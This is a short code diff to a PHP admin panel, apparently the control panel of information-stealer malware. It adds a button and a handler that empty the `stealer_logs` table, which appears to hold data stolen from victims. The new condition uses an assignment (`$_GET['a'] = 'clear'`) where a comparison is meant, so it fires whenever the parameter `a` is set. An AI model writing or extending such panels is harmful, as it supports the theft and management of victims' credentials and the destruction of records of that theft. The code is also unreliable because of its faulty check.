@@ -27,6 +27,11 @@ if (!$install)
 		db_query("DELETE FROM `stealer_logs` WHERE `id` = :1", $_GET['id']);
 		$TEMPLATE['text'] .= '<div class="alert alert-info">Deleted data.</div>';
 	}
+	elseif (isset($_GET['a']) && $_GET['a'] = 'clear')
+	{
+		db_query("TRUNCATE TABLE `stealer_logs`");
+		$TEMPLATE['text'] .= '<div class="alert alert-info">Cleared data.</div>';
+	}
 
 
 	$TEMPLATE['text'] .= '<form method="GET" role="form" class="form-inline">
@@ -37,6 +42,7 @@ if (!$install)
 								<input type="text" class="form-control" id="searchInput" name="search" placeholder="Search...">
 							</div>
 							<button type="submit" class="btn btn-default">Search</button>
+							<a class="btn btn-danger" href="?p=module&m=Stealer&a=clear"><i class="glyphicon glyphicon-trash"></i>&nbsp;Delete all Data</a>
 						</form>
 						<div style="height: 5px;"></div>
 						<table class="table table-hover">
